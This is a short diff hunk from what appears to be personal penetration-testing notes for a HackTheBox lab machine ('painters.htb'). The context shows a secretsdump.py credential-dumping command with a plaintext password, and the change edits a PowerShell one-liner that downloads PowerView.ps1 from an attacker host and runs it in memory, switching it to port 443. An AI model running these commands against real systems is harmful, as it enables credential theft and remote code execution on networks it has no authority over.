@@ -42,6 +42,6 @@ secretsdump.py painters.htb/web_svc:'!QAZ1qaz'@192.168.110.52
 
 # PowerShell remote script
 
-`iex (iwr http://10.10.14.3/PowerView.ps1 -UseBasicParsing)`
+`iex (iwr http://10.10.14.3:443/PowerView.ps1 -UseBasicParsing)`
 
 
